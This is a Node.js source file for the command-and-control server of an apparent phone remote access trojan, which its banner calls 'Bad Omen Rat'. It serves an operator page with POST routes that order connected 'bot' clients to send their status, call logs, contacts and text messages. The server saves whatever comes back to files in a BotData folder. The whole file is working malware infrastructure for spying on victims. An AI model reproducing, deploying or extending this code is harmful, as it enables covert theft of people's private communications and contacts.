const serverPort = 8080;
// import some required modules!
const http = require("http"); // module to transfer data over http
const express = require("express"); // framework to build a web server
const fs = require("fs"); // module to handle the filesystem
const path = require("path"); // module to handle paths
const WebSocket = require("ws"); // module to handle websocket connections

const app = express(); // create the application

// code for serving a favicon
const favicon = require("serve-favicon");
app.use(favicon(path.join(__dirname, "public", "favicon.ico")));

const server = http.createServer(app);
const websocketServer = new WebSocket.Server({ server });

// variables for saving all the connectedClients
var id = 0;
var connectedClients = [];

//when a websocket connection is established
websocketServer.on("connection", (webSocketClient, request) => {
  webSocketClient.id = id++;
  connectedClients[webSocketClient.id] = webSocketClient;

  console.log("Nuova connessione: " + request.socket.remoteAddress.split(":")[3]);

  //when a message is received
  webSocketClient.on("message", (message) => {
    console.log(message);
    switch (message.split("|")[0]) {
      case 'status':
        fs.writeFile(
          __dirname + "/BotData/" + id + "status.txt", message.split("|")[1],
          function (err) {
            if (err) {
              return console.log(err);
            }
            console.log("The file was saved!");
          }
        );
        break;
      case 'calllogs':
        fs.writeFile(
          __dirname + "/BotData/" + id + "calllogs.txt", message.split("|")[1],
          function (err) {
            if (err) {
              return console.log(err);
            }
            console.log("The file was saved!");
          }
        );
        break;
      case 'messages':
        fs.writeFile(
          __dirname + "/BotData/" + id + "messages.txt", message.split("|")[1],
          function (err) {
            if (err) {
              return console.log(err);
            }
            console.log("The file was saved!");
          }
        );
        break;
      case 'contacts':
        fs.writeFile(
          __dirname + "/BotData/" + id + "contacts.txt", message.split("|")[1],
          function (err) {
            if (err) {
              return console.log(err);
            }
            console.log("The file was saved!");
          }
        );
        break;
      default:
        console.log("errore!");
    }
  });
});

app.get("/", (req, res) => {
  res.sendFile(path.resolve(__dirname + "/index.html"));
});

// Define the reqStatus route
app.post("/reqStatus", function (req, res) {
  console.log("stat");
  console.log(connectedClients[id - 1] != null ? true : false);
  connectedClients[id - 1].send('{ "requestType" : "reqStatus"}');
});

// Define the reqCallLogs route
app.post("/reqCallLogs", function (req, res) {
  console.log("calllog");
  console.log(connectedClients[id - 1] != null ? true : false);
  connectedClients[id - 1].send('{ "requestType" : "reqCallLogs"}');
});

// Define the reqContacts route
app.post("/reqContacts", function (req, res) {
  console.log("contacts");
  console.log(connectedClients[id - 1] != null ? true : false);
  connectedClients[id - 1].send('{ "requestType" : "reqContacts"}');
});

// Define the reqMessages route
app.post("/reqMessages", function (req, res) {
  console.log("mess");
  console.log(connectedClients[id - 1] != null ? true : false);
  connectedClients[id - 1].send('{ "requestType" : "reqMessages"}');
});

//start the web server
server.listen(serverPort, () => {
  console.log(`Websocket server started on port ` + serverPort);
  console.log(`
    ██████╗░░█████╗░██████╗░  ░█████╗░███╗░░░███╗███████╗███╗░░██╗  ██████╗░░█████╗░████████╗
    ██╔══██╗██╔══██╗██╔══██╗  ██╔══██╗████╗░████║██╔════╝████╗░██║  ██╔══██╗██╔══██╗╚══██╔══╝
    ██████╦╝███████║██║░░██║  ██║░░██║██╔████╔██║█████╗░░██╔██╗██║  ██████╔╝███████║░░░██║░░░
    ██╔══██╗██╔══██║██║░░██║  ██║░░██║██║╚██╔╝██║██╔══╝░░██║╚████║  ██╔══██╗██╔══██║░░░██║░░░
    ██████╦╝██║░░██║██████╔╝  ╚█████╔╝██║░╚═╝░██║███████╗██║░╚███║  ██║░░██║██║░░██║░░░██║░░░
    ╚═════╝░╚═╝░░╚═╝╚═════╝░  ░╚════╝░╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
                                      By Tosatto Simone Pio`);
});
